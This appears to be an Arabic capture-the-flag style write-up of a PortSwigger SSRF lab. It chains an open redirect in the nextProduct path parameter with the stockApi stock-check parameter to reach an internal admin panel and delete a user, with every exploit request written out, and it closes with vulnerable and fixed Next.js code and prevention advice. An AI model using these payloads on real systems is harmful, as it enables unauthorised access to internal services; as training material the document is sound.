# Lab: SSRF with filter bypass via open redirection vulnerability

> **Category:** SSRF  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - SSRF with filter bypass via open redirection](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة SSRF (Server-Side Request Forgery) في ميزة فحص المخزون (stock check). الخادم مقيد بالوصول فقط إلى التطبيق المحلي (نفس النطاق)، ولكننا سنجد **ثغرة Open Redirection** في مكان آخر من التطبيق، ثم نستخدمها لتوجيه الخادم إلى النظام الداخلي المطلوب (`http://192.168.0.12:8080/admin`) وحذف المستخدم `carlos`.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: فهم ميزة فحص المخزون

- اذهب إلى أي منتج في المتجر
- اضغط على زر **Check stock**
- اعترض طلب `POST /product/stock` في Burp

الطلب الأصلي:

```http
POST /product/stock HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=/product/stock/check
```

### الخطوة 2: اختبار قيود stockApi

- حاول تغيير `stockApi` إلى عنوان خارجي (مثل `http://192.168.0.12:8080/admin`)

**النتيجة:** يتم حظر الطلب ❌ (الخادم مقيد بالوصول فقط إلى التطبيق المحلي)

### الخطوة 3: اكتشاف ثغرة Open Redirection

- في المتجر، اضغط على **Next product** (زر المنتج التالي)
- لاحظ أن هناك معامل `path` في الرابط:

```
https://YOUR-LAB-ID.web-security-academy.net/product/nextProduct?path=/product?productId=2
```

- هذا المعامل ينعكس في هيدر `Location` عند إعادة التوجيه

**هذه ثغرة Open Redirection!** ✅

### الخطوة 4: اختبار Open Redirection

- جرب الرابط التالي:

```
https://YOUR-LAB-ID.web-security-academy.net/product/nextProduct?path=http://example.com
```

**النتيجة:** يتم إعادة التوجيه إلى `http://example.com` ✅

### الخطوة 5: بناء رابط التوجيه إلى النظام الداخلي

نريد توجيه الخادم إلى `http://192.168.0.12:8080/admin`:

```
/product/nextProduct?path=http://192.168.0.12:8080/admin
```

### الخطوة 6: استخدام Open Redirection في SSRF

- ارجع إلى طلب `POST /product/stock`
- غيّر `stockApi` إلى الرابط الذي يسبب إعادة التوجيه (بدون النطاق الكامل):

```http
POST /product/stock HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

### الخطوة 7: إرسال الطلب

- اضغط **Send**

**النتيجة:** يظهر واجهة الإدارة (admin panel) ✅

### الخطوة 8: بناء رابط الحذف

نريد حذف `carlos` عبر الرابط:

```
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

### الخطوة 9: تنفيذ طلب الحذف

- غيّر `stockApi` إلى الرابط أعلاه:

```http
POST /product/stock HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

### الخطوة 10: إرسال الطلب

- اضغط **Send**

**النتيجة:** تم حذف المستخدم `carlos` ✅

### الخطوة 11: حل المختبر

بعد حذف `carlos`، سيتم حل المختبر تلقائياً ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هو Open Redirection؟** | ثغرة تسمح بتوجيه المستخدم (أو الخادم) إلى أي عنوان خارجي |
| **لماذا نحتاجها هنا؟** | الخادم مقيد بالوصول إلى التطبيق المحلي فقط، لكن Open Redirection موجود داخل التطبيق نفسه |
| **كيف يعمل الهجوم؟** | نستخدم Open Redirection لإعادة توجيه الخادم من عنوان داخلي مسموح إلى عنوان داخلي آخر ممنوع |
| **ما هو المسار النهائي؟** | الخادم يرسل طلباً إلى `/product/nextProduct?path=...`، ثم يتم إعادة توجيهه إلى النظام الداخلي |

---

## 📊 شرح آلية الهجوم

```
1. طلب SSRF:
   stockApi = /product/nextProduct?path=http://192.168.0.12:8080/admin

2. الخادم يرسل طلباً إلى (نفس النطاق - مسموح):
   GET /product/nextProduct?path=http://192.168.0.12:8080/admin

3. الخادم يستقبل رد 302 مع Location:
   Location: http://192.168.0.12:8080/admin

4. الخادم يتبع إعادة التوجيه (مطلوب جديد):
   GET http://192.168.0.12:8080/admin

5. يتم عرض صفحة الإدارة (المحتوى يعاد إلينا)
```

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

1. ثغرة **Open Redirection** في معامل `path`
2. الخادم يتبع إعادة التوجيه (redirects) تلقائياً في طلبات SSRF
3. استخدام القيود المستندة إلى النطاق فقط (domain-based restrictions)

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// pages/api/stock.js - ميزة فحص المخزون (SSRF)
export default function handler(req, res) {
  let { stockApi } = req.body;
  
  // خطأ: يسمح فقط بالعناوين من نفس النطاق
  if (!stockApi.startsWith('/')) {
    return res.status(403).send('Access denied');
  }
  
  // خطأ: يتبع إعادة التوجيه (redirects)
  fetch(`https://${req.headers.host}${stockApi}`)
    .then(response => response.text())
    .then(data => res.send(data));
}

// pages/product/nextProduct.js - ثغرة Open Redirection
export default function handler(req, res) {
  const { path } = req.query;
  
  // خطأ: يعيد التوجيه إلى أي عنوان
  res.redirect(path);
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// pages/api/stock.js - ميزة فحص المخزون الآمنة
export default async function handler(req, res) {
  let { stockApi } = req.body;
  
  // التصحيح 1: التحقق من أن الرابط من قائمة بيضاء
  const allowedPaths = ['/product/stock/check', '/product/stock/status'];
  
  if (!allowedPaths.includes(stockApi)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  // التصحيح 2: لا تتبع إعادة التوجيه (redirects)
  const response = await fetch(`https://${req.headers.host}${stockApi}`, {
    redirect: 'manual' // لا تتبع redirects
  });
  
  if (response.status >= 300 && response.status < 400) {
    // التصحيح 3: سجل محاولة إعادة التوجيه وارفضها
    console.warn(`Blocked redirect from ${stockApi} to ${response.headers.get('location')}`);
    return res.status(403).json({ error: 'Redirects are not allowed' });
  }
  
  const data = await response.text();
  res.send(data);
}

// pages/product/nextProduct.js - إصلاح Open Redirection
export default function handler(req, res) {
  const { path } = req.query;
  
  // التصحيح 4: التحقق من أن المسار من قائمة بيضاء
  const allowedPaths = ['/product', '/product/details'];
  const url = new URL(path, `https://${req.headers.host}`);
  
  if (!allowedPaths.some(p => url.pathname.startsWith(p))) {
    return res.status(400).send('Invalid redirect path');
  }
  
  // التصحيح 5: منع إعادة التوجيه إلى نطاقات خارجية
  if (url.hostname !== req.headers.host) {
    return res.status(400).send('External redirects are not allowed');
  }
  
  res.redirect(path);
}
```

**الخلاصة:** 
1. أصلح ثغرة Open Redirection (استخدم whitelist للمسارات)
2. لا تتبع إعادة التوجيه (redirects) في طلبات SSRF
3. استخدم whitelist للمسارات المسموحة في SSRF

---

## 🛡️ كيفية الوقاية (How to Prevent)

| الإجراء | الوصف |
|---------|-------|
| **إصلاح Open Redirection** | لا تسمح بإعادة التوجيه إلى نطاقات خارجية |
| **لا تتبع redirects في SSRF** | استخدم `redirect: 'manual'` في طلبات fetch |
| **Whitelist للـ URLs** | حدد المسارات المسموحة بدلاً من التحقق من البداية فقط |
| **تسجيل محاولات التوجيه** | راقب وسجل محاولات إعادة التوجيه المشبوهة |
| **استخدام allowlist للنطاقات** | حدد النطاقات المسموحة للطلبات الصادرة |

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)
- [SSRF Cheat Sheet](https://portswigger.net/web-security/ssrf)
- [Open Redirection](https://portswigger.net/web-security/open-redirection)
